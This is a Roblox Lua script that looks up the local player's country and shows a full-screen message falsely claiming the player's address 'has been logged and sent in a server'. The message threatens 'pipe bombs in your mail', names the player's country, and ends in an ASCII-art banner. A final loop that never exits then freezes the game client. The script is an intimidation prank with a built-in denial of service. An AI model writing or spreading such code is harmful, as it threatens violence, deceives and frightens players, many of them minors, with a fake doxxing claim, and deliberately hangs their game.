local LocalizationService = game:GetService("LocalizationService")

local countryCodes = {
	AF = "Afghanistan",
	AL = "Albania",
	DZ = "Algeria",
	AD = "Andorra",
	AO = "Angola",
	AR = "Argentina",
	AM = "Armenia",
	AU = "Australia",
	AT = "Austria",
	AZ = "Azerbaijan",
	BS = "Bahamas",
	BH = "Bahrain",
	BD = "Bangladesh",
	BB = "Barbados",
	BY = "Belarus",
	BE = "Belgium",
	BZ = "Belize",
	BJ = "Benin",
	BT = "Bhutan",
	BO = "Bolivia",
	BA = "Bosnia and Herzegovina",
	BW = "Botswana",
	BR = "Brazil",
	BN = "Brunei",
	BG = "Bulgaria",
	BF = "Burkina Faso",
	BI = "Burundi",
	KH = "Cambodia",
	CM = "Cameroon",
	CA = "Canada",
	CV = "Cape Verde",
	CF = "Central African Republic",
	TD = "Chad",
	CL = "Chile",
	CN = "China",
	CO = "Colombia",
	KM = "Comoros",
	CG = "Congo",
	CD = "Congo (DRC)",
	CR = "Costa Rica",
	CI = "Côte d'Ivoire",
	HR = "Croatia",
	CU = "Cuba",
	CY = "Cyprus",
	CZ = "Czech Republic",
	DK = "Denmark",
	DJ = "Djibouti",
	DM = "Dominica",
	DO = "Dominican Republic",
	EC = "Ecuador",
	EG = "Egypt",
	SV = "El Salvador",
	GQ = "Equatorial Guinea",
	ER = "Eritrea",
	EE = "Estonia",
	SZ = "Eswatini",
	ET = "Ethiopia",
	FJ = "Fiji",
	FI = "Finland",
	FR = "France",
	GA = "Gabon",
	GM = "Gambia",
	GE = "Georgia",
	DE = "Germany",
	GH = "Ghana",
	GR = "Greece",
	GD = "Grenada",
	GT = "Guatemala",
	GN = "Guinea",
	GW = "Guinea-Bissau",
	GY = "Guyana",
	HT = "Haiti",
	HN = "Honduras",
	HU = "Hungary",
	IS = "Iceland",
	IN = "India",
	ID = "Indonesia",
	IR = "Iran",
	IQ = "Iraq",
	IE = "Ireland",
	IL = "Israel",
	IT = "Italy",
	JM = "Jamaica",
	JP = "Japan",
	JO = "Jordan",
	KZ = "Kazakhstan",
	KE = "Kenya",
	KI = "Kiribati",
	KR = "Korea, South",
	KW = "Kuwait",
	KG = "Kyrgyzstan",
	LA = "Laos",
	LV = "Latvia",
	LB = "Lebanon",
	LS = "Lesotho",
	LR = "Liberia",
	LY = "Libya",
	LI = "Liechtenstein",
	LT = "Lithuania",
	LU = "Luxembourg",
	MG = "Madagascar",
	MW = "Malawi",
	MY = "Malaysia",
	MV = "Maldives",
	ML = "Mali",
	MT = "Malta",
	MH = "Marshall Islands",
	MR = "Mauritania",
	MU = "Mauritius",
	MX = "Mexico",
	FM = "Micronesia",
	MD = "Moldova",
	MC = "Monaco",
	MN = "Mongolia",
	ME = "Montenegro",
	MA = "Morocco",
	MZ = "Mozambique",
	MM = "Myanmar",
	NA = "Namibia",
	NR = "Nauru",
	NP = "Nepal",
	NL = "Netherlands",
	NZ = "New Zealand",
	NI = "Nicaragua",
	NE = "Niger",
	NG = "Nigeria",
	NO = "Norway",
	OM = "Oman",
	PK = "Pakistan",
	PW = "Palau",
	PA = "Panama",
	PG = "Papua New Guinea",
	PY = "Paraguay",
	PE = "Peru",
	PH = "Philippines",
	PL = "Poland",
	PT = "Portugal",
	QA = "Qatar",
	RO = "Romania",
	RU = "Russia",
	RW = "Rwanda",
	WS = "Samoa",
	SM = "San Marino",
	ST = "São Tomé and Príncipe",
	SA = "Saudi Arabia",
	SN = "Senegal",
	RS = "Serbia",
	SC = "Seychelles",
	SL = "Sierra Leone",
	SG = "Singapore",
	SK = "Slovakia",
	SI = "Slovenia",
	SB = "Solomon Islands",
	SO = "Somalia",
	ZA = "South Africa",
	SS = "South Sudan",
	ES = "Spain",
	LK = "Sri Lanka",
	SD = "Sudan",
	SR = "Suriname",
	SE = "Sweden",
	CH = "Switzerland",
	SY = "Syria",
	TW = "Taiwan",
	TJ = "Tajikistan",
	TZ = "Tanzania",
	TH = "Thailand",
	TL = "Timor-Leste",
	TG = "Togo",
	TO = "Tonga",
	TT = "Trinidad and Tobago",
	TN = "Tunisia",
	TR = "Turkey",
	TM = "Turkmenistan",
	TV = "Tuvalu",
	UG = "Uganda",
	UA = "Ukraine",
	AE = "United Arab Emirates",
	GB = "United Kingdom",
	US = "United States",
	UY = "Uruguay",
	UZ = "Uzbekistan",
	VU = "Vanuatu",
	VE = "Venezuela",
	VN = "Vietnam",
	YE = "Yemen",
	ZM = "Zambia",
	ZW = "Zimbabwe"
}

local function getPlayerCountry(player)
	local success, countryCode = pcall(function()
		return LocalizationService:GetCountryRegionForPlayerAsync(player)
	end)

	if success and countryCode then
		local countryName = countryCodes[countryCode]
		if countryName then
			return " "..string.lower(countryName)
		else
			return " "..countryCode
		end
	else
		return " "
	end
end

local player = game.Players.LocalPlayer
local playerCountry = getPlayerCountry(player)


local asd = Instance.new("Message", workspace)
asd.Text = [[
Your address has been logged and sent in a server
Bro tried to use my script without my knoledge

Good luck having pipe bombs in your mail]].. playerCountry ..[[ user :D!

 ▄▄· ▄▄▄  ▄▄▄ . ▄· ▄▌.▄▄ ·       ▄• ▄▌ ▐ ▄ ·▄▄▄▄  
▐█ ▌▪▀▄ █·▀▄.▀·▐█▪██▌▐█ ▀. ▪     █▪██▌•█▌▐███▪ ██ 
██ ▄▄▐▀▀▄ ▐▀▀▪▄▐█▌▐█▪▄▀▀▀█▄ ▄█▀▄ █▌▐█▌▐█▐▐▌▐█· ▐█▌
▐███▌▐█•█▌▐█▄▄▌ ▐█▀·.▐█▄▪▐█▐█▌.▐▌▐█▄█▌██▐█▌██. ██ 
·▀▀▀ .▀  ▀ ▀▀▀   ▀ •  ▀▀▀▀  ▀█▄▀▪ ▀▀▀ ▀▀ █▪▀▀▀▀▀• 

]]

repeat until 69+420 == 69420
